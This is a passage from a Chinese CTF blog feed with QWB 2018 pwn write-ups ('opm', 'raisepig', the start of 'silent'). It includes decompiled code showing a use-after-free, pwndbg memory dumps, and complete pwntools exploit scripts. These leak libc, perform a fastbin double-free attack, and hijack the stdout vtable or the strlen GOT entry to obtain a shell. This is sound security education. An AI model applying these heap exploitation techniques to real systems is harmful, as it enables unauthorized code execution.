class="number">0x70</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="string">'B'</span>*<span class="number">0x80</span>+<span class="string">'\x10'</span>,<span class="number">2</span>)</span><br><span class="line">add(<span class="string">'C'</span>*<span class="number">0x80</span>,<span class="string">'3'</span>+<span class="string">'D'</span>*<span class="number">0x7f</span>+<span class="string">'\x10'</span>)</span><br><span class="line"><span class="comment"># leak heap addr</span></span><br><span class="line">p.recvuntil(<span class="string">'B'</span>*<span class="number">8</span>)</span><br><span class="line">heap = u64((p.recvuntil(<span class="string">'&gt;'</span>,drop=<span class="keyword">True</span>)).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">success(hex(heap))</span><br><span class="line"><span class="comment"># leak elf base</span></span><br><span class="line">add(<span class="string">'E'</span>*<span class="number">8</span>+p64(heap<span class="number">-0x30</span>),str(<span class="number">131441</span>).ljust(<span class="number">0x80</span>,<span class="string">'F'</span>)+p64(heap+<span class="number">0xc0</span>))</span><br><span class="line">p.recvuntil(<span class="string">'&lt;'</span>)</span><br><span class="line">func = u64((p.recvuntil(<span class="string">'&gt;'</span>,drop=<span class="keyword">True</span>)).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">elf.address = func<span class="number">-0xb30</span></span><br><span class="line">success(hex(elf.address)) </span><br><span class="line"><span class="comment"># leak libc base</span></span><br><span class="line">add(<span class="string">'G'</span>*<span class="number">8</span>+p64(elf.got[<span class="string">'strlen'</span>]),str(<span class="number">131441</span><span class="number">-0x30</span><span class="number">-0x20</span>).ljust(<span class="number">0x80</span>,<span class="string">'H'</span>)+p64(heap+<span class="number">0xc0</span>+<span class="number">0x30</span>+<span class="number">0x20</span>))</span><br><span class="line">p.recvuntil(<span class="string">'&lt;'</span>)</span><br><span class="line">strlen_addr = u64((p.recvuntil(<span class="string">'&gt;'</span>,drop=<span class="keyword">True</span>)).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc.address = strlen_addr - libc.symbols[<span class="string">'strlen'</span>]</span><br><span class="line">success(hex(libc.address))</span><br><span class="line"><span class="comment"># get shell</span></span><br><span class="line">add(<span class="string">'I'</span>*<span class="number">0x10</span>,str(libc.symbols[<span class="string">'system'</span>]&amp;<span class="number">0xffffffff</span>).ljust(<span class="number">0x80</span>,<span class="string">'J'</span>)+p64(elf.got[<span class="string">'strlen'</span>]<span class="number">-0x18</span>))</span><br><span class="line">add(<span class="string">'/bin/sh\x00'</span>,<span class="string">'5'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><p>后来发现fake role向前移0x8就不会破坏top chunk，修改如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak elf addr</span></span><br><span class="line">add(p64(heap<span class="number">-0x30</span>),<span class="string">''</span>.ljust(<span class="number">0x80</span>,<span class="string">'F'</span>)+p64(heap+<span class="number">0xc0</span><span class="number">-0x8</span>))</span><br><span class="line"><span class="comment"># leak libc base</span></span><br><span class="line">add(p64(elf.got[<span class="string">'strlen'</span>]),<span class="string">''</span>.ljust(<span class="number">0x80</span>,<span class="string">'H'</span>)+p64(heap+<span class="number">0xc0</span>+<span class="number">0x30</span>+<span class="number">0x20</span><span class="number">-0x8</span>))</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;opm&quot;&gt;&lt;a href=&quot;#opm&quot; class=&quot;headerlink&quot; title=&quot;opm&quot;&gt;&lt;/a&gt;opm&lt;/h3&gt;&lt;p&gt;首先学习一下在IDA创建结构体，&lt;a href=&quot;https://blog.csdn.net/hgy413/article/deta
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://4f-kira.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>qwb-pwn-raisepig</title>
    <link href="https://4f-kira.github.io/2018/04/12/qwb-pwn-raisepig/"/>
    <id>https://4f-kira.github.io/2018/04/12/qwb-pwn-raisepig/</id>
    <published>2018-04-12T08:32:54.000Z</published>
    <updated>2018-04-12T08:42:42.239Z</updated>
    
    <content type="html"><![CDATA[<h3 id="raisepig"><a href="#raisepig" class="headerlink" title="raisepig"></a>raisepig</h3><p>跟pwnable.tw的Secret Garden非常似。菜单有5个选项：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">puts(&quot;1 . Raise a pig &quot;);</span><br><span class="line">puts(&quot;2 . Visit pigs &quot;);</span><br><span class="line">puts(&quot;3 . Eat a pig&quot;);</span><br><span class="line">puts(&quot;4 . Eat the whole Pig Farm&quot;);</span><br><span class="line">puts(&quot;5 . Leave the Farm&quot;);</span><br></pre></td></tr></table></figure></p><p>IDA中建一个pig的结构体：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00000000 pigs            struc ; (sizeof=0x28, mappedto_6)</span><br><span class="line">00000000 inuse           dq ?</span><br><span class="line">00000008 name            dq ?</span><br><span class="line">00000010 type            dq 3 dup(?)</span><br><span class="line">00000028 pigs            ends</span><br></pre></td></tr></table></figure><p>漏洞点在<code>Eat a pig</code>，inuse位清0，free掉name，在free前仅仅检查了pig_list是否存在，并且没有在free后对指针进行清空，存在UAF，可以double free。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">eat_one</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( pig_num )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Which pig do you want to eat:"</span>);</span><br><span class="line">    _isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt; <span class="number">0x63</span> || !pig_list[v1] )           <span class="comment">// 没有检查inuse</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    srand(<span class="number">0</span>);</span><br><span class="line">    LODWORD(pig_list[v1]-&gt;inuse) = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)pig_list[v1]-&gt;name);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No pig"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>Eat the whole Pig Farm</code>会free掉所有还存在的pig，并且pig_list中指针清零。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x63</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( pig_list[i] &amp;&amp; !LODWORD(pig_list[i]-&gt;inuse) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(pig_list[i]);</span><br><span class="line">    pig_list[i] = <span class="number">0L</span>L;</span><br><span class="line">    --pig_num;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>首先要泄露出libc的地址，分配一个满足unsortedbin大小的chunk，然后free掉，然后再申请一个同样大小的堆，由于是用read读入的，输入结束没有<code>\x00</code>，name填满8字节，打印的时候就会把后面bk的内容打印出来。之后可以考虑使用fastbin attack改写<code>__malloc_hook</code>或者<code>__free_hook</code>为one gadget。</p><p><code>__malloc_hook</code>附近找到一个0x70大小的位置，然而本题环境使用malloc是没法达到one gadget执行需求。重复<code>free</code>同一个内存能触发<code>malloc_printerr</code>, 并调用<code>malloc</code>。然而触发<code>malloc_printerr</code>或直接调用<code>malloc</code>都getshell失败。</p><p>可行姿势为：利用fastbin attack攻击<code>Stdout</code>的file结构<code>_IO_2_1_stdout_</code>，更改<code>stdout</code>的<code>vtable</code>指向one_gadget。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p _IO_2_1_stdout_</span><br><span class="line">$1 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72537977, </span><br><span class="line">    _IO_read_ptr = 0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_read_end = 0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_read_base = 0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_write_base = 0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_write_ptr = 0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_write_end = 0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_buf_base = 0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_buf_end = 0x7f23b5af66a4 &lt;_IO_2_1_stdout_+132&gt; &quot;&quot;, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x7f23b5af58e0 &lt;_IO_2_1_stdin_&gt;, </span><br><span class="line">    _fileno = 1, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = -1, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &apos;\000&apos;, </span><br><span class="line">    _shortbuf = &quot;\n&quot;, </span><br><span class="line">    _lock = 0x7f23b5af7780 &lt;_IO_stdfile_1_lock&gt;, </span><br><span class="line">    _offset = -1, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x7f23b5af57a0 &lt;_IO_wide_data_1&gt;, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = -1, </span><br><span class="line">    _unused2 = &apos;\000&apos; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x7f23b5af46e0 &lt;_IO_file_jumps&gt;  &lt;-- 修改这里指向我们伪造的vtable</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>&lt;_IO_file_jumps&gt;</code>在<code>0x7f23b5af66f8</code>处<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> x/32a 0x7f23b5af6620</span><br><span class="line">0x7f23b5af6620 &lt;_IO_2_1_stdout_&gt;:0xfbad28870x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt;</span><br><span class="line">0x7f23b5af6630 &lt;_IO_2_1_stdout_+16&gt;:0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt;0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt;</span><br><span class="line">0x7f23b5af6640 &lt;_IO_2_1_stdout_+32&gt;:0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt;0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt;</span><br><span class="line">0x7f23b5af6650 &lt;_IO_2_1_stdout_+48&gt;:0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt;0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt;</span><br><span class="line">0x7f23b5af6660 &lt;_IO_2_1_stdout_+64&gt;:0x7f23b5af66a4 &lt;_IO_2_1_stdout_+132&gt;0x0</span><br><span class="line">0x7f23b5af6670 &lt;_IO_2_1_stdout_+80&gt;:0x00x0</span><br><span class="line">0x7f23b5af6680 &lt;_IO_2_1_stdout_+96&gt;:0x00x7f23b5af58e0 &lt;_IO_2_1_stdin_&gt;</span><br><span class="line">0x7f23b5af6690 &lt;_IO_2_1_stdout_+112&gt;:0x10xffffffffffffffff</span><br><span class="line">0x7f23b5af66a0 &lt;_IO_2_1_stdout_+128&gt;:0xa0000000x7f23b5af7780 &lt;_IO_stdfile_1_lock&gt;</span><br><span class="line">0x7f23b5af66b0 &lt;_IO_2_1_stdout_+144&gt;:0xffffffffffffffff0x0</span><br><span class="line">0x7f23b5af66c0 &lt;_IO_2_1_stdout_+160&gt;:0x7f23b5af57a0 &lt;_IO_wide_data_1&gt;0x0</span><br><span class="line">0x7f23b5af66d0 &lt;_IO_2_1_stdout_+176&gt;:0x00x0</span><br><span class="line">0x7f23b5af66e0 &lt;_IO_2_1_stdout_+192&gt;:0xffffffff0x0</span><br><span class="line">0x7f23b5af66f0 &lt;_IO_2_1_stdout_+208&gt;:0x00x7f23b5af46e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">0x7f23b5af6700 &lt;stderr&gt;:0x7f23b5af6540 &lt;_IO_2_1_stderr_&gt;0x7f23b5af6620 &lt;_IO_2_1_stdout_&gt;</span><br><span class="line">0x7f23b5af6710 &lt;stdin&gt;:0x7f23b5af58e0 &lt;_IO_2_1_stdin_&gt;0x7f23b5751b70 &lt;__gcc_personality_v0&gt;</span><br></pre></td></tr></table></figure></p><p>很好彩，在<code>_IO_2_1_stdout_+0x9d</code>处有可利用位置</p><p><code>IO_jump_t</code>中保存了一些函数指针，标准IO函数中会调用这些函数指针：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> * funcs[] = &#123;</span><br><span class="line">   <span class="number">1</span> <span class="literal">NULL</span>, <span class="comment">// "extra word"</span></span><br><span class="line">   <span class="number">2</span> <span class="literal">NULL</span>, <span class="comment">// DUMMY</span></span><br><span class="line">   <span class="number">3</span> <span class="built_in">exit</span>, <span class="comment">// finish</span></span><br><span class="line">   <span class="number">4</span> <span class="literal">NULL</span>, <span class="comment">// overflow</span></span><br><span class="line">   <span class="number">5</span> <span class="literal">NULL</span>, <span class="comment">// underflow</span></span><br><span class="line">   <span class="number">6</span> <span class="literal">NULL</span>, <span class="comment">// uflow</span></span><br><span class="line">   <span class="number">7</span> <span class="literal">NULL</span>, <span class="comment">// pbackfail</span></span><br><span class="line">   <span class="number">8</span> <span class="literal">NULL</span>, <span class="comment">// xsputn  #printf</span></span><br><span class="line">   <span class="number">9</span> <span class="literal">NULL</span>, <span class="comment">// xsgetn</span></span><br><span class="line">   <span class="number">10</span> <span class="literal">NULL</span>, <span class="comment">// seekoff</span></span><br><span class="line">   <span class="number">11</span> <span class="literal">NULL</span>, <span class="comment">// seekpos</span></span><br><span class="line">   <span class="number">12</span> <span class="literal">NULL</span>, <span class="comment">// setbuf</span></span><br><span class="line">   <span class="number">13</span> <span class="literal">NULL</span>, <span class="comment">// sync</span></span><br><span class="line">   <span class="number">14</span> <span class="literal">NULL</span>, <span class="comment">// doallocate</span></span><br><span class="line">   <span class="number">15</span> <span class="literal">NULL</span>, <span class="comment">// read</span></span><br><span class="line">   <span class="number">16</span> <span class="literal">NULL</span>, <span class="comment">// write</span></span><br><span class="line">   <span class="number">17</span> <span class="literal">NULL</span>, <span class="comment">// seek</span></span><br><span class="line">   <span class="number">18</span> pwn,  <span class="comment">// close</span></span><br><span class="line">   <span class="number">19</span> <span class="literal">NULL</span>, <span class="comment">// stat</span></span><br><span class="line">   <span class="number">20</span> <span class="literal">NULL</span>, <span class="comment">// showmanyc</span></span><br><span class="line">   <span class="number">21</span> <span class="literal">NULL</span>, <span class="comment">// imbue</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p><code>printf</code>是通过<code>_IO_file_xsputn</code>实现的，<code>fake_vtable[7]</code>放入one_gadget，调用<code>printf</code>的时候就可以getshell。下面开始构造payload：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> x/32gx 0x7f23b5af6620+0x9d+3</span><br><span class="line">0x7f23b5af66c0 &lt;_IO_2_1_stdout_+160&gt;:0x00007f23b5af57a00x0000000000000000</span><br><span class="line">0x7f23b5af66d0 &lt;_IO_2_1_stdout_+176&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7f23b5af66e0 &lt;_IO_2_1_stdout_+192&gt;:0x00000000ffffffff0x0000000000000000</span><br><span class="line">0x7f23b5af66f0 &lt;_IO_2_1_stdout_+208&gt;:0x00000000000000000x00007f23b5af46e0 --&gt; vtable</span><br></pre></td></tr></table></figure></p><p>构造如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;a&apos;*3 + p64(0)*2 + p64(0xffffffff) + p64(0)*2 + p64(fake_vtable)</span><br></pre></td></tr></table></figure></p><p>由于没有泄露heap地址，直接利用本次写入one gadget到<code>&lt;_IO_2_1_stdout_+208&gt;</code>，那么<code>fake_vtable</code>地址为<code>&lt;_IO_2_1_stdout_+208-7*8&gt;</code></p><p>EXP:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./raisepig2'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./raisepig2'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span><span class="params">(a=<span class="string">''</span>)</span>:</span></span><br><span class="line">gdb.attach(p,a)</span><br><span class="line"><span class="keyword">if</span> a == <span class="string">''</span>:</span><br><span class="line">raw_input()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(namelen,name,pigtype,shell=<span class="number">0</span>)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Your choice : '</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Length of the name :'</span>,str(namelen))</span><br><span class="line">p.sendafter(<span class="string">'The name of pig :'</span>,name)</span><br><span class="line"><span class="keyword">if</span> shell == <span class="number">0</span>:</span><br><span class="line">p.sendlineafter(<span class="string">'The type of the pig :'</span>,pigtype)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visit</span><span class="params">()</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Your choice : '</span>,<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eat</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Your choice : '</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Which pig do you want to eat:'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eat_all</span><span class="params">()</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Your choice : '</span>,<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc addr</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'0'</span>,<span class="string">'0'</span>)</span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">'1'</span>,<span class="string">'1'</span>)</span><br><span class="line">eat(<span class="number">0</span>)</span><br><span class="line">eat(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'2'</span>*<span class="number">8</span>,<span class="string">'2'</span>)</span><br><span class="line">visit()</span><br><span class="line">p.recvuntil(<span class="string">'22222222'</span>)</span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3c4b20</span> - <span class="number">88</span></span><br><span class="line">success(<span class="string">'0x%x'</span> % libc.address)</span><br><span class="line">success(<span class="string">'0x%x'</span> % libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbin attack</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'3'</span>,<span class="string">'3'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'4'</span>,<span class="string">'4'</span>)</span><br><span class="line">eat(<span class="number">3</span>)</span><br><span class="line">eat(<span class="number">4</span>)</span><br><span class="line">eat(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,p64(libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]+<span class="number">0x9d</span>),<span class="string">'5'</span>)</span><br><span class="line"><span class="comment">#add(0x60,p64(libc.symbols["__malloc_hook"]-0x23),'5')</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'6'</span>,<span class="string">'6'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'7'</span>,<span class="string">'7'</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = libc.address + <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"\x00"</span>*<span class="number">3</span></span><br><span class="line">payload += <span class="number">2</span>*p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0xffffffff</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(one_gadget)</span><br><span class="line">payload += p64(libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]+<span class="number">0x98</span>)</span><br><span class="line">add(<span class="number">0x60</span>,payload,<span class="string">'8'</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#add(0x60,'a'*0x13+p64(one_gadget),'8')</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;raisepig&quot;&gt;&lt;a href=&quot;#raisepig&quot; class=&quot;headerlink&quot; title=&quot;raisepig&quot;&gt;&lt;/a&gt;raisepig&lt;/h3&gt;&lt;p&gt;跟pwnable.tw的Secret Garden非常似。菜单有5个选项：&lt;br&gt;&lt;figu
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://4f-kira.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>qwb-pwn-silent1&amp;2</title>
    <link href="https://4f-kira.github.io/2018/04/04/qwb-pwn-silent1&amp;2/"/>
    <id>https://4f-kira.github.io/2018/04/04/qwb-pwn-silent1&amp;2/</id>
    <published>2018-04-04T03:04:57.000Z</published>
    <updated>2018-04-12T08:33:41.834Z</updated>
    
    <content type="html"><![CDATA[<p>好菜，只做了一题，慢慢补~</p><h3 id="silent"><a href="#silent" class="headerlink" title="silent"></a>silent</h3><p>程序有3个功能，分别是add，delete和edit</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">add_</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%lu"</span>, &amp;size);</span><br><span class="line">  getchar();</span><br><span class="line">  v3 = <span class="built_in">malloc</span>(size);</span><br><span class="line">  read_(v3, size);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; i &lt;= <span class="number">9</span> &amp;&amp; s[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">10</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  s[i] = (<span class="keyword">char</span> *)v3;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span 